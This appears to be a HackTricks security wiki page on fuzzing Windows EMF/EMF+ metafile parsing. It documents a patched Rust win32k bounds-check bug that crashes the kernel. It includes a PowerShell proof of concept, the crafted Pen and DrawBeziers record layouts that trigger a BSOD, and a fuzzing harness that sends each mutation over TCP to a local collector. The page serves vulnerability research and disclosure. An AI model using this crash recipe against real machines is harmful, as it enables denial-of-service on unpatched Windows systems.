# EMF/WMF/EMF+ Tricks (GDI/Win32k exploitation & fuzzing)

{{#include ../../../banners/hacktricks-training.md}}

EMF (Enhanced Metafile) is a compact stream of GDI commands. EMF+ embeds GDI+ records inside EMF via EMR_COMMENT_EMFPLUS and can pack multiple EMF+ records in a single EMF record. The rich record set and compactness make EMF/EMF+ a powerful target for fuzzing and for reaching privileged kernel parsing paths through common user-mode drawing APIs.

Key pipeline during playback (Windows 11 24H2):
- GDI/EMF+/GDI+ shapes are widened and flattened in user/kernel transitions.
- The resulting outline is converted to a REGION in kernel space, implemented in Rust in win32kbase_rs.sys for 24H2 client SKUs.
- Outlines are represented as a singly linked list of edge blocks maintained in a global edge table. Incorrect geometry or malformed paths can stress this edge management.

Impact (example bug class): A crafted EMF+ can cause a bounds-check failure in the Rust REGION conversion path (RegionCore_set_from_path ➜ region_from_path_mut), tripping core::panicking::panic_bounds_check() and raising a SYSTEM_SERVICE_EXCEPTION (BSOD). This is a reliable kernel DoS from low integrity via user-mode drawing APIs.

Note: Windows Server SKUs do not include the Rust REGION component as of the fix timeline discussed below.

## Practical exploitation/fuzzing notes

- Seed selection: Include EMF+ seeds so the fuzzer reaches deeper GDI+/EMF+ record handling (e.g., EmfPlusDrawBeziers, EmfPlusDrawPath, Pen/Brush objects).
- Record packing: EMF+ records can be packed inside EMR_COMMENT_EMFPLUS, and multiple records may be grouped – ideal for mutational fuzzing that flips Flags, Counts, Sizes, and appends/removes points.
- Crash durability at scale: If using SHM mode and a RAM-disk queue, a BSOD will wipe in-flight mutations. Add a tiny exfiltration channel in the harness to persist every mutation before executing it (see code below). Additionally, use MemProcFS forensic mode on full memory dumps to recover the RAM-disk queue after BugCheck.

### Reliable user-mode path to the kernel REGION conversion

Although Graphics::FromImage() is documented for drawable Image objects (e.g., Bitmap), passing a Metafile is accepted and reaches the vulnerable path-to-region code when DrawImage() is invoked. This allows a low-integrity user to trigger kernel REGION conversion on both x86 and x64.

PowerShell PoC that loads a base64-embedded EMF+ and plays it through System.Drawing:

```powershell
Add-Type -AssemblyName System.Drawing;
Add-Type -AssemblyName System.Windows.Forms;

$b = [Convert]::FromBase64String("AQAAAGw...NAAA=");  # EMF+/EMF blob

$s = [System.IO.MemoryStream]::new($b)
$f = New-Object System.Windows.Forms.Form
$g = [System.Drawing.Graphics]::FromHwnd($f.Handle)
$h = $g.GetHdc()
$m = New-Object System.Drawing.Imaging.Metafile($s, $h)

$mg = [System.Drawing.Graphics]::FromImage($m)
$mg.DrawImage([System.Drawing.Image]::FromStream($s),0,0)
```

## Trigger anatomy: wide Pen + mutated EmfPlusDrawBeziers

A reliable BSOD was obtained by combining:
- A Pen object configured to force a very wide stroke during playback, and
- An EmfPlusDrawBeziers record with 17 absolute points while the nominal Count field remains 4 (ignored by the code path), stressing path parsing and edge generation.

When widened/flattened and converted to a region, the resulting edge-block layout allowed an internal index to surpass its upper bound in win32kbase_rs!region_from_path_mut, which deliberately panics on bound check failure (Rust behavior). Call chain observed in triage:

NtGdiSelectClipPath ➜ Win32kRS::RegionCore_set_from_path() [win32kbase.sys] ➜ Win32kRS::RegionCore_set_from_path() [win32kbase_rs.sys] ➜ region_from_path_mut() ➜ core::panicking::panic_bounds_check().

For reference, example record shapes used in the crash case:

<details>
<summary>EMF+ Pen object forcing a wide stroke</summary>

```c
EmfPlusObject pen = {
    .Type                 = 0x4008,     // EmfPlusObject
    .Flags                = 0x0200,     // EmfPlusPen
    .Size                 = 0x00000030,
    .DazaSize             = 0x00000024,
    .ObjectData = {
        .Version          = 0xDBC01002, // EMF+
        .Type             = 0x42200000, // PenDataNonCenter, PenDataStartCap
        .PenDataFlags     = 0x00000202, // UnitTypeInch
        .PenUnit          = 0x00000004,
        .PenWidth         = 0xFFFFFFEE,
        .OptionalData = {
            .StartCap     = 0x0000FC05,
            .PenAlignment = 0x0051E541
        }
    }
};
```

</details>

<details>
<summary>EMF+ DrawBeziers with 17 absolute points (nominal Count ignored)</summary>

```c
EmfPlusDrawBeziers beziers = {
    .Type      = 0x4019,
    .Flags     = 0x00D6,      // C=1, P=0, ObjectID=0x36
    .Size      = 0x00000050,  // 80 bytes
    .DataSize  = 0x00000044,  // 68 bytes
    .Count     = 0x00000004,  // nominal count (ignored)
    // PointData is read as EmfPlusPoint objects with absolute coordinates.
    .PointData[17] = {
        { 0xE63D, 0x0000 },   // (-6595 ,     0)
        { 0xFC05, 0x0000 },   // (-1019 ,     0)
        { 0xE541, 0x0051 },   // (-6847 ,    81)
        { 0x0049, 0x7FFF },   // (   73 , 32767)
        { 0x004C, 0x1400 },   // (   76 ,  5120)
        { 0x4008, 0x0202 },   // (16392 ,   514)
        { 0x0067, 0x0000 },   // (  103 ,     0)
        { 0x1002, 0xDBC0 },   // ( 4098 , -9280)
        { 0x001C, 0x0000 },   // (   28 ,     0)
        { 0x0010, 0x0000 },   // (   16 ,     0)
        { 0x1002, 0xDBC0 },   // ( 4098 , -9280)
        { 0x0001, 0x0000 },   // (    1 ,     0)
        { 0x0060, 0x4008 },   // (   96 , 16392)
        { 0x0003, 0x0000 },   // (    3 ,     0)
        { 0x0000, 0x4600 },   // (    0 , 17920)
        { 0x0000, 0x0100 },   // (    0 ,   256)
        { 0x004C, 0x0000 }    // (   76 ,     0)
    }
};
```

</details>

### Minimization/confirmation toggles

The following byte-level edits avoid the buggy geometry, useful both to minimize and confirm the condition:
- Flip C/P flags to read PointData as EmfPlusPointF: `$b[0x15f]=0;`
- Increase `Size` to append a flat point: `$b[0x160]=84; $b=$b[0..351]+(0,0,0,0)+$b[352..($b.Length-1)];`
- Decrease `DataSize` to 64 to drop the last point: `$b[0x164]=64;`

## Harness trick: persist every mutation despite BSODs

When fuzzing kernel paths with WinAFL in SHM mode, use a minimal TCP sender inside the harness to exfiltrate every mutation (4‑byte size header + raw data) to a threaded receiver that stores inputs and periodically zips them. This preserves the exact crashing input across BugChecks.

<details>
<summary>Client (C, Winsock)</summary>

```c
int send_data(char* data, uint32_t size) {
    WSADATA wsa; SOCKET s; struct sockaddr_in server; wchar_t ip_address[] = L"192.168.1.1";
    server.sin_family = AF_INET; server.sin_port = htons(4444);
    if (WSAStartup(MAKEWORD(2,2), &wsa)!=0) return 1;
    if ((s=socket(AF_INET, SOCK_STREAM, 0))==INVALID_SOCKET){WSACleanup();return 1;}
    if (InetPton(AF_INET, ip_address, &(server.sin_addr))!=1){closesocket(s);WSACleanup();return 1;}
    if (connect(s,(struct sockaddr*)&server,sizeof(server))<0){closesocket(s);WSACleanup();return 1;}
    uint32_t size_header = htonl(size);
    if (send(s,(char*)&size_header,sizeof(size_header),0)<0){closesocket(s);WSACleanup();return 1;}
    if (send(s,data,size,0)<0){closesocket(s);WSACleanup();return 1;}
    closesocket(s); WSACleanup(); return 0; }
```

</details>

<details>
<summary>Server (Python, threaded; zips every 5k files)</summary>

```python
#!/usr/bin/env python3
import os, socket, zipfile, threading
from concurrent.futures import ThreadPoolExecutor
file_counter=0; file_counter_lock=threading.Lock(); zip_counter=1

def handle_client(cs, addr):
    global file_counter, zip_counter
    data_size=int.from_bytes(cs.recv(4),'big')
    data=bytearray()
    while len(data)<data_size:
        pkt = cs.recv(min(1024, data_size-len(data)))
        if not pkt: break
        data.extend(pkt)
    with file_counter_lock:
        file_counter+=1; name=f"id_{file_counter:06d}"; print(f"Received {file_counter}")
    open(name,"wb").write(data)
    if file_counter % 5000 == 0:
        zip_name=f"archive_{zip_counter:03d}.zip"
        with zipfile.ZipFile(zip_name,'w') as z:
            for i in range(file_counter-4999, file_counter+1):
                z.write(f"id_{i:06d}"); os.remove(f"id_{i:06d}")
        zip_counter+=1
    cs.close()

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.bind(("0.0.0.0",4444)); s.listen(5)
    with ThreadPoolExecutor(max_workers=20) as ex:
        print("[*] Waiting for incoming connections...")
        while True: cs, addr = s.accept(); ex.submit(handle_client, cs, addr)
main()
```

</details>

Notes:
- Keep harness I/O outside the measured target loop so it doesn’t distort WinAFL performance metrics.
- If you use a RAM-disk for the fuzzer queue, MemProcFS forensic mode can mount a full memory dump and auto-discover the RAM-disk volume to recover queued inputs post-crash.

## Detection and triage

- BugCheck: SYSTEM_SERVICE_EXCEPTION during or after GDI operations.
- Stack often includes: `NtGdiSelectClipPath → win32kbase_rs!region_from_path_mut → core::panicking::panic_bounds_check`.
- Quick user-mode repro path: System.Drawing Graphics::FromImage(Metafile) + DrawImage().
- Triage helpers: BugId for rapid crash classification; memory carve of the fuzzer queue via MemProcFS when Volatility-based extraction is cumbersome.

## Mitigations / versions

- Fixed in Windows 11 24H2 starting OS Build 26100.4202 (KB5058499 preview, 2025‑05‑28). Rollout completed July 2025 cumulative updates.
- Internal changes (as observed): GlobalEdgeTable::add_edge() split into add_edge_original() / add_edge_new(); the new path is bounds-hardened and behind a feature-gate (Feature_Servicing_Win32kRSPathToRegion_IsEnabled()).
- Avoid trusting EMF/EMF+ from untrusted sources; sanitize or block. Avoid feeding Metafile objects into Graphics::FromImage() in untrusted workflows.

## Tooling for campaigns at scale

- Fuzzer: WinAFL (shared-memory mode `-s`) with a small initial corpus including EMF+.
- Orchestrator: WinAFL Pet to manage multi-instance runs and monitoring.
- Crash triage: BugId.
- Queue recovery: MemProcFS forensic mode to discover and extract the RAM-disk queue from full memory dumps after BugCheck.

## References

- [Checkpoint Research – Denial of Fuzzing: Rust in the Windows kernel](https://research.checkpoint.com/2025/denial-of-fuzzing-rust-in-the-windows-kernel/)
- [WinAFL](https://github.com/googleprojectzero/winafl)
- [WinAFL Pet](https://github.com/sgabe/winaflpet)
- [BugId](https://github.com/SkyLined/BugId)
- [MemProcFS](https://github.com/ufrisk/MemProcFS)

{{#include ../../../banners/hacktricks-training.md}}
